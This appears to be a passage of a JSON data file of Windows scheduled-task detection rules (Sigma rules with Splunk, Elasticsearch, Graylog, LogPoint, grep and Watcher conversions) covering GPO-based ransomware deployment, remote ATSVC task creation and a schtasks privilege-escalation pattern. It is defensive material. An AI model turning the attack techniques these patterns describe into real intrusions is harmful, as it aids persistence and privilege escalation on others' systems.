CommandLine:\"*\\\\/change*\\\\/TN*\\\\/RU*\\\\/RP*\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"schtasks.exe\" CommandLine=\"*/change*/TN*/RU*/RP*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(Image=\"schtasks.exe\" CommandLine=\"*/change*/TN*/RU*/RP*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*schtasks\\\\.exe)(?=.*.*/change.*/TN.*/RU.*/RP.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Persistence and Execution at scale via GPO scheduled task\nid: a8f29a7b-b137-4446-80a0-b804272f3da2\ndescription: Detect lateral movement using GPO scheduled task, ususally used to deploy ransomware at scale\nauthor: Samir Bousseaden\nreferences:\n    - https://twitter.com/menasec1/status/1106899890377052160\ntags:\n    - attack.persistence\n    - attack.lateral_movement\n    - attack.t1053\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: \\\\*\\SYSVOL\n        RelativeTargetName: '*ScheduledTasks.xml'\n        Accesses: '*WriteData*'\n    condition: selection\nfalsepositives: \n    - if the source IP is not localhost then it's super suspicious, better to monitor both local and remote changes to GPO scheduledtasks\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Persistence and Execution at scale via GPO scheduled task\nid: a8f29a7b-b137-4446-80a0-b804272f3da2\ndescription: Detect lateral movement using GPO scheduled task, ususally used to deploy ransomware at scale\nauthor: Samir Bousseaden\nreferences:\n    - https://twitter.com/menasec1/status/1106899890377052160\ntags:\n    - attack.persistence\n    - attack.lateral_movement\n    - attack.t1053\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: \\\\*\\SYSVOL\n        RelativeTargetName: '*ScheduledTasks.xml'\n        Accesses: '*WriteData*'\n    condition: selection\nfalsepositives: \n    - if the source IP is not localhost then it's super suspicious, better to monitor both local and remote changes to GPO scheduledtasks\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\SYSVOL AND RelativeTargetName.keyword:*ScheduledTasks.xml AND Accesses.keyword:*WriteData*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Persistence-and-Execution-at-scale-via-GPO-scheduled-task <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Persistence and Execution at scale via GPO scheduled task\",\\n    \"description\": \"Detect lateral movement using GPO scheduled task, ususally used to deploy ransomware at scale\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.lateral_movement\",\\n      \"attack.t1053\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\SYSVOL AND RelativeTargetName.keyword:*ScheduledTasks.xml AND Accesses.keyword:*WriteData*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\SYSVOL AND RelativeTargetName.keyword:*ScheduledTasks.xml AND Accesses.keyword:*WriteData*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Persistence and Execution at scale via GPO scheduled task\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\SYSVOL AND RelativeTargetName.keyword:*ScheduledTasks.xml AND Accesses.keyword:*WriteData*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\SYSVOL\" RelativeTargetName=\"*ScheduledTasks.xml\" Accesses=\"*WriteData*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\SYSVOL\" RelativeTargetName=\"*ScheduledTasks.xml\" Accesses=\"*WriteData*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5145)(?=.*\\\\\\\\.*\\\\SYSVOL)(?=.*.*ScheduledTasks\\\\.xml)(?=.*.*WriteData.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Remote Task Creation via ATSVC named pipe\nid: f6de6525-4509-495a-8a82-1f8b0ed73a00\ndescription: Detects remote task creation via at.exe or API interacting with ATSVC namedpipe\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html\ntags:\n    - attack.lateral_movement\n    - attack.persistence\n    - attack.t1053\n    - car.2013-05-004\n    - car.2015-04-001\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName: atsvc\n        Accesses: '*WriteData*'\n    condition: selection\nfalsepositives: \n    - pentesting\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Remote Task Creation via ATSVC named pipe\nid: f6de6525-4509-495a-8a82-1f8b0ed73a00\ndescription: Detects remote task creation via at.exe or API interacting with ATSVC namedpipe\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html\ntags:\n    - attack.lateral_movement\n    - attack.persistence\n    - attack.t1053\n    - car.2013-05-004\n    - car.2015-04-001\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName: atsvc\n        Accesses: '*WriteData*'\n    condition: selection\nfalsepositives: \n    - pentesting\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName:\"atsvc\" AND Accesses.keyword:*WriteData*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Remote-Task-Creation-via-ATSVC-named-pipe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Remote Task Creation via ATSVC named pipe\",\\n    \"description\": \"Detects remote task creation via at.exe or API interacting with ATSVC namedpipe\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.persistence\",\\n      \"attack.t1053\",\\n      \"car.2013-05-004\",\\n      \"car.2015-04-001\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName:\\\\\"atsvc\\\\\" AND Accesses.keyword:*WriteData*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName:\\\\\"atsvc\\\\\" AND Accesses.keyword:*WriteData*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Remote Task Creation via ATSVC named pipe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName:\"atsvc\" AND Accesses.keyword:*WriteData*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" RelativeTargetName=\"atsvc\" Accesses=\"*WriteData*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" RelativeTargetName=\"atsvc\" Accesses=\"*WriteData*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5145)(?=.*\\\\\\\\.*\\\\IPC\\\\$)(?=.*atsvc)(?=.*.*WriteData.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Interactive AT Job\nid: 60fc936d-2eb0-4543-8a13-911c750a1dfc\ndescription: Detect an interactive AT job, which may be used as a form of privilege escalation\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053/T1053.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html\ndate: 2019/10/24\nmodified: 2019/11/11\ntags:\n    - attack.privilege_escalation\n    - attack.t1053\ndetection:\n    selection:\n        Image|endswith: '\\at.exe'\n        CommandLine|contains: 'interactive'\n    condition: selection\nfalsepositives:\n    - Unlikely (at.exe deprecated as of Windows 8)\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Interactive AT Job\nid: 60fc936d-2eb0-4543-8a13-911c750a1dfc\ndescription: Detect an interactive AT job, which may be used as a form of privilege escalation\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053/T1053.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html\ndate: 2019/10/24\nmodified: 2019/11/11\ntags:\n    - attack.privilege_escalation\n    - attack.t1053\ndetection:\n    selection:\n        Image|endswith: '\\at.exe'\n        CommandLine|contains: 'interactive'\n    condition: selection\nfalsepositives:\n    - Unlikely (at.exe deprecated as of Windows 8)\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\at.exe AND CommandLine.keyword:*interactive*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Interactive-AT-Job <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Interactive AT Job\",\\n    \"description\": \"Detect an interactive AT job, which may be used as a form of privilege escalation\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1053\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\at.exe AND CommandLine.keyword:*interactive*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\at.exe AND CommandLine.keyword:*interactive*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Interactive AT Job\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\at.exe AND CommandLine.keyword:*interactive*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\at.exe\" CommandLine=\"*interactive*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\at.exe\" CommandLine=\"*interactive*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\at\\\\.exe)(?=.*.*interactive.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Rare Scheduled Task Creations\nid: b20f6158-9438-41be-83da-a5a16ac90c2b\nstatus: experimental\ndescription: This rule detects rare scheduled task creations. Typically software gets installed on multiple systems and not only on a few. The aggregation and count\n    function selects tasks with rare names.\ntags:\n    - attack.persistence\n    - attack.t1053\n    - attack.s0111\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: taskscheduler\ndetection:\n    selection:\n        EventID: 106\n    timeframe: 7d\n    condition: selection | count() by TaskName < 5 \nfalsepositives:\n    - Software installation\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Rare Scheduled Task Creations\nid: b20f6158-9438-41be-83da-a5a16ac90c2b\nstatus: experimental\ndescription: This rule detects rare scheduled task creations. Typically software gets installed on multiple systems and not only on a few. The aggregation and count\n    function selects tasks with rare names.\ntags:\n    - attack.persistence\n    - attack.t1053\n    - attack.s0111\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: taskscheduler\ndetection:\n    selection:\n        EventID: 106\n    timeframe: 7d\n    condition: selection | count() by TaskName < 5 \nfalsepositives:\n    - Software installation\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Rare-Scheduled-Task-Creations <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Rare Scheduled Task Creations\",\\n    \"description\": \"This rule detects rare scheduled task creations. Typically software gets installed on multiple systems and not only on a few. The aggregation and count function selects tasks with rare names.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1053\",\\n      \"attack.s0111\"\\n    ],\\n    \"query\": \"EventID:\\\\\"106\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"7d\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:\\\\\"106\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          },\\n          \"aggs\": {\\n            \"by\": {\\n              \"terms\": {\\n                \"field\": \"TaskName.keyword\",\\n                \"size\": 10,\\n                \"order\": {\\n                  \"_count\": \"asc\"\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.aggregations.by.buckets.0.doc_count\": {\\n        \"lt\": 5\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Rare Scheduled Task Creations\\'\",\\n        \"body\": \"Hits:\\\\n{{#aggregations.by.buckets}}\\\\n {{key}} {{doc_count}}\\\\n{{/aggregations.by.buckets}}\\\\n\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID=\"106\" | eventstats count as val by TaskName| search val < 5", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "event_id=\"106\" | chart count() as val by TaskName | search val < 5", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^106'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Rare Schtasks Creations\nid: b0d77106-7bb0-41fe-bd94-d1752164d066\ndescription: Detects rare scheduled tasks creations that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types\n    of malicious code\nstatus: experimental\nauthor: Florian Roth\ntags:\n    - attack.execution\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.t1053\n    - car.2013-08-001\nlogsource:\n    product: windows\n    service: security\n    definition: 'The Advanced Audit Policy setting Object Access > Audit Other Object Access Events has to be configured to allow this detection (not in the baseline recommendations by Microsoft). We also recommend extracting the Command field from the embedded XML in the event data.'\ndetection:\n    selection:\n        EventID: 4698\n    timeframe: 7d\n    condition: selection | count() by TaskName < 5 \nfalsepositives: \n    - Software installation\n    - Software updates\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Rare Schtasks Creations\nid: b0d77106-7bb0-41fe-bd94-d1752164d066\ndescription: Detects rare scheduled tasks creations that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types\n    of malicious code\nstatus: experimental\nauthor: Florian Roth\ntags:\n    - attack.execution\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.t1053\n    - car.2013-08-001\nlogsource:\n    product: windows\n    service: security\n    definition: 'The Advanced Audit Policy setting Object Access > Audit Other Object Access Events has to be configured to allow this detection (not in the baseline recommendations by Microsoft). We also recommend extracting the Command field from the embedded XML in the event data.'\ndetection:\n    selection:\n        EventID: 4698\n    timeframe: 7d\n    condition: selection | count() by TaskName < 5 \nfalsepositives: \n    - Software installation\n    - Software updates\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Rare-Schtasks-Creations <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Rare Schtasks Creations\",\\n    \"description\": \"Detects rare scheduled tasks creations that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious code\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.privilege_escalation\",\\n      \"attack.persistence\",\\n      \"attack.t1053\",\\n      \"car.2013-08-001\"\\n    ],\\n    \"query\": \"EventID:\\\\\"4698\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"7d\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:\\\\\"4698\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          },\\n          \"aggs\": {\\n            \"by\": {\\n              \"terms\": {\\n                \"field\": \"TaskName.keyword\",\\n                \"size\": 10,\\n                \"order\": {\\n                  \"_count\": \"asc\"\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.aggregations.by.buckets.0.doc_count\": {\\n        \"lt\": 5\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Rare Schtasks Creations\\'\",\\n        \"body\": \"Hits:\\\\n{{#aggregations.by.buckets}}\\\\n {{key}} {{doc_count}}\\\\n{{/aggregations.by.buckets}}\\\\n\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID=\"4698\" | eventstats count as val by TaskName| search val < 5", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4698\") | chart count() as val by TaskName | search val < 5", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^4698'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Scheduled Task Creation\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: experimental\ndescription: Detects the creation of scheduled tasks in user session\nauthor: Florian Roth\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\schtasks.exe'\n        CommandLine: '* /create *'\n    filter:\n        User: NT AUTHORITY\\SYSTEM\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1053\n    - attack.s0111\n    - car.2013-08-001\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Scheduled Task Creation\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: experimental\ndescription: Detects the creation of scheduled tasks in user session\nauthor: Florian Roth\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\schtasks.exe'\n        CommandLine: '* /create *'\n    filter:\n        User: NT AUTHORITY\\SYSTEM\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1053\n    - attack.s0111\n    - car.2013-08-001\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\schtasks.exe AND CommandLine.keyword:*\\\\ \\\\/create\\\\ *) AND (NOT (User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Scheduled-Task-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Scheduled Task Creation\",\\n    \"description\": \"Detects the creation of scheduled tasks in user session\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1053\",\\n      \"attack.s0111\",\\n      \"car.2013-08-001\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\schtasks.exe AND CommandLine.keyword:*\\\\\\\\ \\\\\\\\/create\\\\\\\\ *) AND (NOT (User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\schtasks.exe AND CommandLine.keyword:*\\\\\\\\ \\\\\\\\/create\\\\\\\\ *) AND (NOT (User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Scheduled Task Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\schtasks.exe AND CommandLine.keyword:* \\\\/create *) AND (NOT (User:\"NT AUTHORITY\\\\\\\\SYSTEM\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\schtasks.exe\" CommandLine=\"* /create *\") NOT (User=\"NT AUTHORITY\\\\\\\\SYSTEM\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\schtasks.exe\" CommandLine=\"* /create *\")  -(User=\"NT AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\schtasks\\\\.exe)(?=.*.* /create .*)))(?=.*(?!.*(?:.*(?=.*NT AUTHORITY\\\\SYSTEM)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Windows 10 scheduled task SandboxEscaper 0-day\nid: 931b6802-d6a6-4267-9ffa-526f57f22aaf\nstatus: experimental\ndescription: Detects Task Scheduler .job import arbitrary DACL write\\par\nreferences:\n    - https://github.com/SandboxEscaper/polarbearrepo/tree/master/bearlpe\nauthor: Olaf Hartong\ndate: 2019/05/22\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: schtasks.exe\n        CommandLine: '*/change*/TN*/RU*/RP*'\n    condition: selection\nfalsepositives:\n    - Unknown\ntags:\n    - attack.privilege_escalation\n    - attack.execution\n    - attack.t1053\n    - car.2013-08-001\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Windows 10 scheduled task SandboxEscaper 0-day\nid: 931b6802-d6a6-4267-9ffa-526f57f22aaf\nstatus: experimental\ndescription: Detects Task Scheduler .job import arbitrary DACL write\\par\nreferences:\n    - https://github.com/SandboxEscaper/polarbearrepo/tree/master/bearlpe\nauthor: Olaf Hartong\ndate: 2019/05/22\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: schtasks.exe\n        CommandLine: '*/change*/TN*/RU*/RP*'\n    condition: selection\nfalsepositives:\n    - Unknown\ntags:\n    - attack.privilege_escalation\n    - 